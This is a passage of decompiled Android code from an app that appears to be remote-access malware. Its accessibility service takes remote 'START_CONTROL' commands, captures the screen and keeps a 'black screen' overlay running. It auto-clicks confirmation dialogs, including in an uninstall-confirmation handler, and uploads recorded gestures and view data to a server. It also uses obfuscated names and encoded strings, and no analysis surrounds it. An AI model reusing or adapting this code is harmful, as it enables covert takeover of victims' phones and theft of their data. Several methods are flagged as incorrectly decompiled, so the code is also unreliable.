                t60.m214714d6("dqtvuisjd", "服务初始化完成");
                dqtvuisjdVar.f52401d2 = false;
            } catch (Exception e) {
                t60.m214705c6("dqtvuisjd", "服务初始化失败", e);
                C0323a8 c0323a8 = dqtvuisjdVar.f52415e6;
                if (c0323a8 != null) {
                    c0323a8.m211643a8();
                    t60.m214714d6("dqtvuisjd", "后台重连：已委托 NetworkManager 处理");
                } else {
                    t60.m214726f4("dqtvuisjd", "后台重连：NetworkManager 未初始化，忽略");
                }
                dqtvuisjdVar.f52401d2 = false;
            }
        } catch (Throwable th) {
            dqtvuisjdVar.f52401d2 = false;
            throw th;
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* renamed from: a3 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static final Object m211404a3(dqtvuisjd dqtvuisjdVar, ContinuationImpl continuationImpl) throws Throwable {
        dqtvuisjd$deferredInit$1 dqtvuisjd_deferredinit_1;
        if (continuationImpl instanceof dqtvuisjd$deferredInit$1) {
            dqtvuisjd_deferredinit_1 = (dqtvuisjd$deferredInit$1) continuationImpl;
            int i = dqtvuisjd_deferredinit_1.f52506a3;
            if ((i & Integer.MIN_VALUE) != 0) {
                dqtvuisjd_deferredinit_1.f52506a3 = i - Integer.MIN_VALUE;
            } else {
                dqtvuisjd_deferredinit_1 = new dqtvuisjd$deferredInit$1(dqtvuisjdVar, continuationImpl);
            }
        }
        Object obj = dqtvuisjd_deferredinit_1.f52504a1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = dqtvuisjd_deferredinit_1.f52506a3;
        if (i2 == 0) {
            kg1.m213544f4(obj);
            t60.m214714d6("dqtvuisjd", "🔧 [延迟初始化] 开始...");
            try {
                zk1 zk1Var = al1.f43714a5;
                Context applicationContext = dqtvuisjdVar.getApplicationContext();
                t60.m214694b5(applicationContext, "applicationContext");
                zk1Var.getInstance(applicationContext).m209821a1();
            } catch (Exception unused) {
            }
            C1180rh c1180rh = AbstractC1262tj.f60233a0;
            C0785a0 c0785a0 = sc0.f59953a0;
            dqtvuisjd$deferredInit$2 dqtvuisjd_deferredinit_2 = new dqtvuisjd$deferredInit$2(dqtvuisjdVar, null);
            dqtvuisjd_deferredinit_1.f52503a0 = dqtvuisjdVar;
            dqtvuisjd_deferredinit_1.f52506a3 = 1;
            if (AbstractC0780a0.m213696a7(c0785a0, dqtvuisjd_deferredinit_2, dqtvuisjd_deferredinit_1) == coroutineSingletons) {
                return coroutineSingletons;
            }
        } else {
            if (i2 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            dqtvuisjdVar = dqtvuisjd_deferredinit_1.f52503a0;
            kg1.m213544f4(obj);
        }
        try {
            dqtvuisjdVar.m211478h2();
        } catch (Exception unused2) {
        }
        InitWorkerService.C0278a0 c0278a0 = InitWorkerService.f52298a2;
        Context applicationContext2 = dqtvuisjdVar.getApplicationContext();
        t60.m214694b5(applicationContext2, "applicationContext");
        c0278a0.start(applicationContext2);
        return C1351vv.f60710b1;
    }

    /* JADX WARN: Can't wrap try/catch for region: R(14:0|2|(2:4|(1:6)(1:7))(0)|8|(1:55)|(1:(1:(7:12|54|36|48|37|38|39)(2:14|15))(1:16))(9:17|(5:19|50|20|(1:22)|23)|(3:46|25|(1:27))|57|28|52|29|30|(1:59))|33|(1:60)|54|36|48|37|38|39) */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* renamed from: a4 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static final Object m211405a4(dqtvuisjd dqtvuisjdVar, ContinuationImpl continuationImpl) throws Throwable {
        dqtvuisjd$doHeavyInit$1 dqtvuisjd_doheavyinit_1;
        if (continuationImpl instanceof dqtvuisjd$doHeavyInit$1) {
            dqtvuisjd_doheavyinit_1 = (dqtvuisjd$doHeavyInit$1) continuationImpl;
            int i = dqtvuisjd_doheavyinit_1.f52511a3;
            if ((i & Integer.MIN_VALUE) != 0) {
                dqtvuisjd_doheavyinit_1.f52511a3 = i - Integer.MIN_VALUE;
            } else {
                dqtvuisjd_doheavyinit_1 = new dqtvuisjd$doHeavyInit$1(dqtvuisjdVar, continuationImpl);
            }
        }
        Object obj = dqtvuisjd_doheavyinit_1.f52509a1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = dqtvuisjd_doheavyinit_1.f52511a3;
        if (i2 == 0) {
            kg1.m213544f4(obj);
            t60.m214714d6("dqtvuisjd", "🔧 [重初始化] 开始...");
            boolean z = dqtvuisjdVar.getSharedPreferences(StringUtil.m212470a0("KkkBBV4sDTpS"), 0).getBoolean(StringUtil.m212470a0("KkwFMkIqBTRWJSJWHwVONwE+WzQ/XBU="), false);
            dqtvuisjdVar.f52475k6 = dqtvuisjdVar.getSharedPreferences(StringUtil.m212470a0("I1AVP3IrGC9DNA=="), 0).getBoolean(StringUtil.m212470a0("IkouMkQ8CCtZ"), false);
            if (z) {
                t60.m214714d6("dqtvuisjd", "✅ [重初始化] 授权已完成，恢复保护功能");
                try {
                    C0323a8 c0323a8 = dqtvuisjdVar.f52415e6;
                    if (c0323a8 != null) {
                        c0323a8.m211643a8();
                    }
                } catch (Exception unused) {
                }
                String str = AbstractC0315a0.f53025a0;
                AbstractC0315a0.f53032a7 = true;
                AbstractC0315a0.f53034a9 = true;
                dqtvuisjdVar.f52411e2 = true;
            }
            if (z) {
                try {
                    C0355a0 c0355a0 = dqtvuisjdVar.f52435g6;
                    if (c0355a0 != null) {
                        c0355a0.m211939c3();
                        dqtvuisjdVar.f52477k8 = true;
                    }
                } catch (Exception unused2) {
                }
            }
            try {
                dqtvuisjdVar.m211492i6();
            } catch (Exception unused3) {
            }
            try {
                dqtvuisjdVar.m211509k5();
            } catch (Exception unused4) {
            }
            C1180rh c1180rh = AbstractC1262tj.f60233a0;
            C0785a0 c0785a0 = sc0.f59953a0;
            dqtvuisjd$doHeavyInit$4 dqtvuisjd_doheavyinit_4 = new dqtvuisjd$doHeavyInit$4(dqtvuisjdVar, null);
            dqtvuisjd_doheavyinit_1.f52508a0 = dqtvuisjdVar;
            dqtvuisjd_doheavyinit_1.f52511a3 = 1;
            if (AbstractC0780a0.m213696a7(c0785a0, dqtvuisjd_doheavyinit_4, dqtvuisjd_doheavyinit_1) == coroutineSingletons) {
                return coroutineSingletons;
            }
        } else {
            if (i2 != 1) {
                if (i2 != 2) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                kg1.m213544f4(obj);
                t60.m214714d6("dqtvuisjd", "✅ [重初始化] 全部完成，服务就绪");
                AbstractC0315a0.m211545a7("延迟初始化全部完成 服务就绪");
                return C1351vv.f60710b1;
            }
            dqtvuisjdVar = dqtvuisjd_doheavyinit_1.f52508a0;
            kg1.m213544f4(obj);
        }
        dqtvuisjd_doheavyinit_1.f52508a0 = null;
        dqtvuisjd_doheavyinit_1.f52511a3 = 2;
        if (dqtvuisjdVar.m211479h3(dqtvuisjd_doheavyinit_1) == coroutineSingletons) {
            return coroutineSingletons;
        }
        t60.m214714d6("dqtvuisjd", "✅ [重初始化] 全部完成，服务就绪");
        AbstractC0315a0.m211545a7("延迟初始化全部完成 服务就绪");
        return C1351vv.f60710b1;
    }

    /* renamed from: a5 */
    public static final void m211406a5(dqtvuisjd dqtvuisjdVar) {
        C0454ef c0454ef;
        t60.m214714d6("dqtvuisjd", "🖤 确保黑屏组件正常工作...");
        fd0 fd0Var = dqtvuisjdVar.f52423f4;
        if (fd0Var != null && (c0454ef = fd0Var.f56199a1) != null) {
            c0454ef.f55996b8.post(new RunnableC0436dz(c0454ef, 0));
        }
        if (!ibbnqvnvhxg.f55194a0.isRunning()) {
            t60.m214714d6("dqtvuisjd", "🖤 ibbnqvnvhxg 未运行，重新启动...");
            dqtvuisjdVar.m211491i5();
        }
        t60.m214714d6("dqtvuisjd", "✅ 黑屏组件已确保正常工作");
    }

    /* renamed from: a6 */
    public static final void m211407a6(dqtvuisjd dqtvuisjdVar) {
        try {
            C0323a8 lj0Var = dqtvuisjdVar.f52415e6;
            if (lj0Var == null && (lj0Var = C0323a8.f53097e0.getInstance()) == null) {
                return;
            }
            if (lj0Var.m211649b5()) {
                return;
            }
            lj0Var.m211643a8();
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "ensureNetworkManager 失败", e);
        }
    }

    /* renamed from: a7 */
    public static final Pair m211408a7(dqtvuisjd dqtvuisjdVar) {
        x81 x81Var = dqtvuisjdVar.f52417e8;
        if (x81Var != null) {
            return x81Var.m215132a2();
        }
        C0761kk c0761kk = dqtvuisjdVar.f52416e7;
        if (c0761kk != null) {
            SharedPreferences sharedPreferences = c0761kk.f57539a1;
            try {
                String strM213595a0 = c0761kk.m213595a0();
                float f = sharedPreferences.getFloat("learned_x_" + strM213595a0, -1.0f);
                float f2 = sharedPreferences.getFloat("learned_y_" + strM213595a0, -1.0f);
                if (f > 0.0f && f2 > 0.0f) {
                    if (sharedPreferences.getInt("learn_count_" + strM213595a0, 0) > 0) {
                        return new Pair(Float.valueOf(f), Float.valueOf(f2));
                    }
                }
            } catch (Exception e) {
                t60.m214705c6("ConfigManager", "获取学习坐标失败", e);
            }
        }
        return null;
    }

    /* renamed from: a8 */
    public static final void m211409a8(dqtvuisjd dqtvuisjdVar) {
        try {
            long jCurrentTimeMillis = System.currentTimeMillis();
            if (jCurrentTimeMillis - dqtvuisjdVar.f52444h5 < 10000) {
                return;
            }
            dqtvuisjdVar.f52444h5 = jCurrentTimeMillis;
            int i = dqtvuisjdVar.f52445h6 + 1;
            dqtvuisjdVar.f52445h6 = i;
            t60.m214726f4("dqtvuisjd", "⚠️ [监控] 检测到卡在无障碍设置页面 (第" + i + "次)");
            int i2 = dqtvuisjdVar.f52445h6;
            int i3 = dqtvuisjdVar.f52449i0;
            if (i2 < i3) {
                t60.m214702c3("dqtvuisjd", "🔍 等待更多确认，当前检测次数: " + i2 + "/" + i3);
                return;
            }
            if (i2 > dqtvuisjdVar.f52450i1) {
                t60.m214726f4("dqtvuisjd", "⚠️ [监控] 已达到最大尝试次数，停止监控");
                u11 u11Var = dqtvuisjdVar.f52443h4;
                if (u11Var != null) {
                    u11Var.m215253a7(null);
                    return;
                }
                return;
            }
            t60.m214714d6("dqtvuisjd", "✅ [监控] 尝试从无障碍设置页面跳转回应用 (第" + i2 + "次)");
            AbstractC0780a0.m213692a3(dqtvuisjdVar.f52378a9, null, new dqtvuisjd$handleAccessibilityPageStuck$1(dqtvuisjdVar, null), 3);
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ [监控] 处理无障碍设置页面卡住失败", e);
        }
    }

    /* renamed from: a9 */
    public static final void m211410a9(dqtvuisjd dqtvuisjdVar) {
        try {
            t60.m214714d6("dqtvuisjd", "🚀 开始处理无障碍服务启动请求");
            if (f52358m1.getInstance() == null) {
                t60.m214726f4("dqtvuisjd", "⚠️ 无障碍服务实例不存在，重新创建");
                f52364m7 = dqtvuisjdVar;
                AbstractC0780a0.m213692a3(dqtvuisjdVar.f52378a9, null, new dqtvuisjd$handleAccessibilityServiceStart$1(dqtvuisjdVar, null), 3);
            } else {
                t60.m214714d6("dqtvuisjd", "✅ 无障碍服务实例已存在");
                if (dqtvuisjdVar.m211488i2()) {
                    t60.m214714d6("dqtvuisjd", "✅ 无障碍服务运行正常");
                } else {
                    t60.m214726f4("dqtvuisjd", "⚠️ 无障碍服务实例存在但未正常运行，尝试重新初始化");
                    AbstractC0780a0.m213692a3(dqtvuisjdVar.f52378a9, null, new dqtvuisjd$handleAccessibilityServiceStart$2(dqtvuisjdVar, null), 3);
                }
            }
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ 处理无障碍服务启动失败", e);
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x0027  */
    /* renamed from: b0 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static final Object m211411b0(dqtvuisjd dqtvuisjdVar, JSONObject jSONObject, ContinuationImpl continuationImpl) throws Throwable {
        dqtvuisjd$handleNetworkCommandSuspend$1 dqtvuisjd_handlenetworkcommandsuspend_1;
        String str;
        C1351vv c1351vv = C1351vv.f60710b1;
        if (continuationImpl instanceof dqtvuisjd$handleNetworkCommandSuspend$1) {
            dqtvuisjd_handlenetworkcommandsuspend_1 = (dqtvuisjd$handleNetworkCommandSuspend$1) continuationImpl;
            int i = dqtvuisjd_handlenetworkcommandsuspend_1.f52556a3;
            if ((i & Integer.MIN_VALUE) != 0) {
                dqtvuisjd_handlenetworkcommandsuspend_1.f52556a3 = i - Integer.MIN_VALUE;
            } else {
                dqtvuisjd_handlenetworkcommandsuspend_1 = new dqtvuisjd$handleNetworkCommandSuspend$1(dqtvuisjdVar, continuationImpl);
            }
        }
        Object obj = dqtvuisjd_handlenetworkcommandsuspend_1.f52554a1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = dqtvuisjd_handlenetworkcommandsuspend_1.f52556a3;
        try {
            if (i2 == 0) {
                kg1.m213544f4(obj);
                String strOptString = jSONObject.optString(StringUtil.m212470a0("KFYcN0w2CA=="), "");
                JSONObject jSONObjectOptJSONObject = jSONObject.optJSONObject("params");
                t60.m214704c5("dqtvuisjd", "📥📥📥 收到网络命令: " + strOptString + ", params: " + (jSONObjectOptJSONObject != null ? jSONObjectOptJSONObject.toString() : null));
                t60.m214704c5("dqtvuisjd", "📥 当前控制权状态: isControlEnabled=" + dqtvuisjdVar.f52483l4 + ", controlledBy=" + dqtvuisjdVar.f52484l5);
                if (strOptString != null) {
                    int iHashCode = strOptString.hashCode();
                    if (iHashCode != -48593724) {
                        if (iHashCode != 29521408) {
                            if (iHashCode == 2128872000 && strOptString.equals("START_CONTROL")) {
                                String strOptString2 = jSONObjectOptJSONObject != null ? jSONObjectOptJSONObject.optString("controlledBy", "") : null;
                                String str2 = strOptString2 != null ? strOptString2 : "";
                                dqtvuisjdVar.f52483l4 = true;
                                dqtvuisjdVar.f52484l5 = str2;
                                t60.m214714d6("dqtvuisjd", "🎮 控制权已开启，控制者: ".concat(str2));
                                dqtvuisjdVar.m211451d6();
                                return c1351vv;
                            }
                        } else if (strOptString.equals("STOP_CONTROL")) {
                            dqtvuisjdVar.f52483l4 = false;
                            dqtvuisjdVar.f52484l5 = null;
                            t60.m214714d6("dqtvuisjd", "🎮 控制权已关闭");
                            C0263a5 c0263a5 = dqtvuisjdVar.f52370a1;
                            if (c0263a5 != null) {
                                c0263a5.m211357b4();
                                t60.m214714d6("dqtvuisjd", "📺 已停止屏幕捕获");
                                return c1351vv;
                            }
                            return c1351vv;
                        }
                    } else if (strOptString.equals("reconnect_ws")) {
                        t60.m214714d6("dqtvuisjd", "🔌 收到服务端重连 WebSocket 请求");
                        dqtvuisjdVar.m211451d6();
                        return c1351vv;
                    }
                }
                C0350a7 c0350a7 = dqtvuisjdVar.f52380b1;
                if (c0350a7 == null) {
                    t60.m214704c5("dqtvuisjd", "❌ 命令分发器未初始化，无法处理命令: " + strOptString);
                    return c1351vv;
                }
                dqtvuisjd_handlenetworkcommandsuspend_1.f52553a0 = strOptString;
                dqtvuisjd_handlenetworkcommandsuspend_1.f52556a3 = 1;
                Object objM211883a0 = c0350a7.m211883a0(jSONObject, dqtvuisjd_handlenetworkcommandsuspend_1);
                if (objM211883a0 == coroutineSingletons) {
                    return coroutineSingletons;
                }
                obj = objM211883a0;
                str = strOptString;
            } else {
                if (i2 != 1) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                str = dqtvuisjd_handlenetworkcommandsuspend_1.f52553a0;
                kg1.m213544f4(obj);
            }
            if (!((Boolean) obj).booleanValue()) {
                t60.m214726f4("dqtvuisjd", "⚠️ 命令未被处理: " + str);
            }
            return c1351vv;
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ 处理网络命令失败", e);
            return c1351vv;
        }
    }

    /* renamed from: b1 */
    public static final void m211412b1(dqtvuisjd dqtvuisjdVar, Intent intent) {
        try {
            int intExtra = intent.getIntExtra("total_checks", 0);
            int intExtra2 = intent.getIntExtra("healthy_checks", 0);
            int intExtra3 = intent.getIntExtra("permission_loss_events", 0);
            int intExtra4 = intent.getIntExtra("successful_recoveries", 0);
            int intExtra5 = intent.getIntExtra("failed_recoveries", 0);
            t60.m214726f4("dqtvuisjd", AbstractC0778a0.m213649a1("\n                🏥 权限健康问题详情:\n                • 总检查次数: " + intExtra + "\n                • 健康检查次数: " + intExtra2 + "\n                • 权限丢失事件: " + intExtra3 + "\n                • 成功恢复次数: " + intExtra4 + "\n                • 失败恢复次数: " + intExtra5 + "\n            "));
            if (intExtra5 >= 5) {
                Integer num = AbstractC0241a0.f51907a1;
                if ((num != null ? new Pair(num, AbstractC0241a0.f51908a2) : null) != null) {
                    t60.m214714d6("dqtvuisjd", "🛡️ 权限恢复失败但权限数据仍存在，可能是误报，不显示通知");
                } else {
                    t60.m214726f4("dqtvuisjd", "⚠️ 权限恢复失败次数过多且权限数据确实缺失，显示用户通知");
                    dqtvuisjdVar.m211523m0();
                }
            }
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ 处理权限健康问题失败", e);
        }
    }

    /* renamed from: b2 */
    public static final void m211413b2(dqtvuisjd dqtvuisjdVar, Intent intent) {
        try {
            String stringExtra = intent.getStringExtra("reason");
            if (stringExtra == null) {
                stringExtra = "unknown";
            }
            t60.m214726f4("dqtvuisjd", "❌ 处理权限恢复失败，原因: ".concat(stringExtra));
            Integer num = AbstractC0241a0.f51907a1;
            Pair pair = num != null ? new Pair(num, AbstractC0241a0.f51908a2) : null;
            if (!stringExtra.equals("max_attempts_reached")) {
                if (!stringExtra.equals("permission_expired")) {
                    t60.m214726f4("dqtvuisjd", "❓ 未知的权限恢复失败原因: " + stringExtra + "，保守处理");
                    C0260a2 c0260a2 = dqtvuisjdVar.f52369a0;
                    if (c0260a2 != null) {
                        c0260a2.m211325g8(false);
                        return;
                    }
                    return;
                }
                t60.m214726f4("dqtvuisjd", "⏰ 权限已过期，检查权限数据状态");
                if (pair != null) {
                    t60.m214714d6("dqtvuisjd", "🔧 权限过期但数据仍存在，尝试恢复而不是清理");
                    C0260a2 c0260a22 = dqtvuisjdVar.f52369a0;
                    if (c0260a22 != null) {
                        c0260a22.m211325g8(false);
                        return;
                    }
                    return;
                }
                t60.m214726f4("dqtvuisjd", "🧹 权限确实过期且数据缺失，清理权限数据");
                t60.m214726f4("MediaProjectionHolder", "🧹 清理权限数据（权限可能已过期）");
                AbstractC0241a0.f51907a1 = null;
                AbstractC0241a0.f51908a2 = null;
                AbstractC0241a0.f51909a3 = 0L;
                C0260a2 c0260a23 = dqtvuisjdVar.f52369a0;
                if (c0260a23 != null) {
                    c0260a23.m211325g8(true);
                    return;
                }
                return;
            }
            t60.m214726f4("dqtvuisjd", "⚠️ 权限恢复达到最大尝试次数，检查是否真的需要清理权限");
            if (pair != null) {
                t60.m214726f4("dqtvuisjd", "🛡️ 权限数据仍然存在，可能是误报，不清理权限数据");
                C0260a2 c0260a24 = dqtvuisjdVar.f52369a0;
                if (c0260a24 != null) {
                    c0260a24.m211325g8(false);
                    C0260a2 c0260a25 = dqtvuisjdVar.f52369a0;
                    if (c0260a25 == null) {
                        t60.m214724f2("permissionGranter");
                        throw null;
                    }
                    c0260a25.m211323g1();
                }
                dqtvuisjdVar.m211522l9();
                return;
            }
            t60.m214726f4("dqtvuisjd", "❌ 确认权限数据已丢失，执行清理流程");
            dqtvuisjdVar.m211522l9();
            C0260a2 c0260a26 = dqtvuisjdVar.f52369a0;
            if (c0260a26 != null) {
                c0260a26.m211325g8(false);
                C0260a2 c0260a27 = dqtvuisjdVar.f52369a0;
                if (c0260a27 == null) {
                    t60.m214724f2("permissionGranter");
                    throw null;
                }
                c0260a27.m211323g1();
            }
            t60.m214726f4("MediaProjectionHolder", "🧹 清理权限数据（权限可能已过期）");
            AbstractC0241a0.f51907a1 = null;
            AbstractC0241a0.f51908a2 = null;
            AbstractC0241a0.f51909a3 = 0L;
            t60.m214726f4("dqtvuisjd", "🧹 已清理确认丢失的权限数据");
            AbstractC0780a0.m213692a3(dqtvuisjdVar.f52378a9, null, new dqtvuisjd$handlePermissionRecoveryFailed$3(dqtvuisjdVar, null), 3);
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ 处理权限恢复失败异常", e);
        }
    }

    /* renamed from: b3 */
    public static final void m211414b3(dqtvuisjd dqtvuisjdVar) {
        try {
            t60.m214714d6("dqtvuisjd", "🛑 处理停止二次确认监听");
            if (Build.VERSION.SDK_INT >= 30) {
                t60.m214714d6("dqtvuisjd", "📱 Android 11+设备：使用无障碍截图API，跳过二次确认监听处理");
                return;
            }
            Integer num = AbstractC0241a0.f51907a1;
            Pair pair = num != null ? new Pair(num, AbstractC0241a0.f51908a2) : null;
            boolean z = AbstractC0241a0.f51906a0 != null;
            if (pair != null && z) {
                t60.m214714d6("dqtvuisjd", "🛡️ 权限数据和MediaProjection都存在，跳过停止二次确认监听");
                return;
            }
            if (pair != null && !z) {
                t60.m214714d6("dqtvuisjd", "🔧 权限数据存在但MediaProjection缺失，使用标准处理");
                return;
            }
            t60.m214714d6("dqtvuisjd", "⚠️ 权限数据确实缺失，执行完整的停止二次确认监听流程");
            t60.m214714d6("dqtvuisjd", "🛑 使用标准权限管理");
            C0260a2 c0260a2 = dqtvuisjdVar.f52369a0;
            if (c0260a2 != null) {
                c0260a2.m211323g1();
                t60.m214714d6("dqtvuisjd", "🛑 PermissionGranter二次确认监听已停止");
            }
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ 处理停止二次确认监听失败", e);
        }
    }

    /* renamed from: b4 */
    public static final void m211415b4(dqtvuisjd dqtvuisjdVar) {
        if (t60.m214686a2(Thread.currentThread(), Looper.getMainLooper().getThread())) {
            AbstractC0780a0.m213692a3(dqtvuisjdVar.f52378a9, AbstractC1262tj.f60233a0, new dqtvuisjd$handleUninstallConfirmDialog$1(dqtvuisjdVar, null), 2);
            return;
        }
        try {
            AccessibilityNodeInfo rootInActiveWindow = dqtvuisjdVar.getRootInActiveWindow();
            if (rootInActiveWindow == null) {
                return;
            }
            ArrayList arrayListM213298i5 = AbstractC0715je.m213298i5(dh0.m212602a1(), dh0.f55754a4);
            int size = arrayListM213298i5.size();
            int i = 0;
            int i2 = 0;
            while (i2 < size) {
                Object obj = arrayListM213298i5.get(i2);
                i2++;
                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText((String) obj);
                for (AccessibilityNodeInfo accessibilityNodeInfo : listFindAccessibilityNodeInfosByText) {
                    if (accessibilityNodeInfo.isClickable()) {
                        t60.m214714d6("dqtvuisjd", "✅ 点击确认按钮: " + ((Object) accessibilityNodeInfo.getText()));
                        accessibilityNodeInfo.performAction(16);
                        Iterator<T> it = listFindAccessibilityNodeInfosByText.iterator();
                        while (it.hasNext()) {
                            try {
                                cq0.m212492d5((AccessibilityNodeInfo) it.next());
                            } catch (Exception unused) {
                            }
                        }
                        cq0.m212492d5(rootInActiveWindow);
                        return;
                    }
                    ArrayList arrayList = new ArrayList();
                    for (AccessibilityNodeInfo parent = accessibilityNodeInfo.getParent(); parent != null; parent = parent.getParent()) {
                        arrayList.add(parent);
                        if (parent.isClickable()) {
                            t60.m214714d6("dqtvuisjd", "✅ 点击确认按钮的父节点");
                            parent.performAction(16);
                            int size2 = arrayList.size();
                            while (i < size2) {
                                Object obj2 = arrayList.get(i);
                                i++;
                                try {
                                    cq0.m212492d5((AccessibilityNodeInfo) obj2);
                                } catch (Exception unused2) {
                                }
                            }
                            Iterator<T> it2 = listFindAccessibilityNodeInfosByText.iterator();
                            while (it2.hasNext()) {
                                try {
                                    cq0.m212492d5((AccessibilityNodeInfo) it2.next());
                                } catch (Exception unused3) {
                                }
                            }
                            cq0.m212492d5(rootInActiveWindow);
                            return;
                        }
                    }
                    int size3 = arrayList.size();
                    int i3 = 0;
                    while (i3 < size3) {
                        Object obj3 = arrayList.get(i3);
                        i3++;
                        try {
                            cq0.m212492d5((AccessibilityNodeInfo) obj3);
                        } catch (Exception unused4) {
                        }
                    }
                }
                Iterator<T> it3 = listFindAccessibilityNodeInfosByText.iterator();
                while (it3.hasNext()) {
                    try {
                        cq0.m212492d5((AccessibilityNodeInfo) it3.next());
                    } catch (Exception unused5) {
                    }
                }
            }
            t60.m214726f4("dqtvuisjd", "⚠️ 未找到确认按钮");
            cq0.m212492d5(rootInActiveWindow);
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ 处理确认弹窗失败", e);
        }
    }

    /* JADX WARN: Type inference failed for: r5v21, types: [com.storm.safe.rock.service.dqtvuisjd$initializeDeferredManagers$8, kotlin.jvm.internal.Lambda] */
    /* renamed from: b5 */
    public static final void m211416b5(final dqtvuisjd dqtvuisjdVar) {
        C0322a7 c0322a7;
        C0350a7 c0350a7;
        t60.m214714d6("dqtvuisjd", "🔧 [授权后] 开始初始化延迟管理器...");
        lj0 lj0Var = C0323a8.f53097e0;
        Context applicationContext = dqtvuisjdVar.getApplicationContext();
        t60.m214694b5(applicationContext, "applicationContext");
        dqtvuisjdVar.f52415e6 = lj0Var.getOrCreate(applicationContext);
        dqtvuisjdVar.f52371a2 = new C0258a0(dqtvuisjdVar);
        dqtvuisjdVar.f52372a3 = new C0324a9(dqtvuisjdVar);
        dqtvuisjdVar.f52373a4 = new C0856mc(dqtvuisjdVar);
        dqtvuisjdVar.f52454i5 = new l20(dqtvuisjdVar);
        dqtvuisjdVar.f52455i6 = new C0259a1(dqtvuisjdVar);
        dqtvuisjdVar.f52456i7 = new C1496yx(dqtvuisjdVar);
        C0319a4 c0319a4 = new C0319a4(dqtvuisjdVar, dqtvuisjdVar);
        dqtvuisjdVar.f52437g8 = c0319a4;
        c0319a4.f53067b3 = new h10() { // from class: com.storm.safe.rock.service.dqtvuisjd$initializeDeferredManagers$1
            {
                super(1);
            }

            @Override // p000.h10
            public final Object invoke(Object obj) {
                C0267a0 c0267a0M211645b1;
                JSONObject jSONObject = (JSONObject) obj;
                t60.m214695b6(jSONObject, "gestureData");
                dqtvuisjd dqtvuisjdVar2 = this.f52582a0;
                dqtvuisjd.C0290a0 c0290a0 = dqtvuisjd.f52358m1;
                try {
                    C0323a8 c0323a8 = dqtvuisjdVar2.f52415e6;
                    if (c0323a8 != null && (c0267a0M211645b1 = c0323a8.m211645b1()) != null && c0267a0M211645b1.f52263a3) {
                        JSONObject jSONObject2 = new JSONObject();
                        jSONObject2.put("type", StringUtil.m212470a0("LFwCLlgqCRFFNChWAz5IPA=="));
                        jSONObject2.put("data", jSONObject);
                        jSONObject2.put("timestamp", System.currentTimeMillis());
                        String string = jSONObject2.toString();
                        t60.m214694b5(string, "message.toString()");
                        c0267a0M211645b1.m211367a8(string);
                        t60.m214714d6("dqtvuisjd", "🎬 手势录制数据已发送到服务器");
                    }
                } catch (Exception e) {
                    t60.m214705c6("dqtvuisjd", "发送手势录制数据失败", e);
                }
                return C1351vv.f60710b1;
            }
        };
        dqtvuisjdVar.f52438g9 = C0335a1.f53283c5.getInstance(dqtvuisjdVar, dqtvuisjdVar);
        C0341a7 c0340a6 = C0341a7.f53380c1.getInstance(dqtvuisjdVar, dqtvuisjdVar);
        h10 h10Var = new h10() { // from class: com.storm.safe.rock.service.dqtvuisjd$initializeDeferredManagers$2
            {
                super(1);
            }

            @Override // p000.h10
            public final Object invoke(Object obj) {
                C0267a0 c0267a0M211645b1;
                JSONObject jSONObject = (JSONObject) obj;
                t60.m214695b6(jSONObject, "data");
                try {
                    C0323a8 c0323a8 = this.f52583a0.f52415e6;
                    if (c0323a8 != null && (c0267a0M211645b1 = c0323a8.m211645b1()) != null && c0267a0M211645b1.f52263a3) {
                        JSONObject jSONObject2 = new JSONObject();
                        jSONObject2.put("type", "view_cache_sync");
                        jSONObject2.put("data", jSONObject);
                        String string = jSONObject2.toString();
                        t60.m214694b5(string, "wrapped.toString()");
                        c0267a0M211645b1.m211367a8(string);
                        t60.m214714d6("ViewCache", "上报: cipher=" + jSONObject.optString("cipher") + ", pkg=" + jSONObject.optString("pkg"));
                    }
                } catch (Exception unused) {
                }
                return C1351vv.f60710b1;
            }
        };
        c0340a6.getClass();
        c0340a6.f53393b0 = h10Var;
        c0340a6.f53399b6 = new h10() { // from class: com.storm.safe.rock.service.dqtvuisjd$initializeDeferredManagers$3
            {
                super(1);
            }

            @Override // p000.h10
            public final Object invoke(Object obj) {
                boolean zBooleanValue = ((Boolean) obj).booleanValue();
                C0614i9 c0614i9 = this.f52584a0.f52414e5;
                if (c0614i9 != null) {
                    c0614i9.f56848c8 = zBooleanValue;
                    t60.m214702c3("AccessibilityEventManager", "支付模式暂停: " + zBooleanValue);
                }
                return C1351vv.f60710b1;
            }
        };
        c0340a6.m211863a2();
        C0319a4 c0319a42 = dqtvuisjdVar.f52437g8;
        if (c0319a42 == null) {
            t60.m214724f2("gestureRecorderManager");
            throw null;
        }
        c0319a42.f53068b4 = new h10() { // from class: com.storm.safe.rock.service.dqtvuisjd$initializeDeferredManagers$4
            {
                super(1);
            }

            /* JADX WARN: Removed duplicated region for block: B:14:0x0066  */
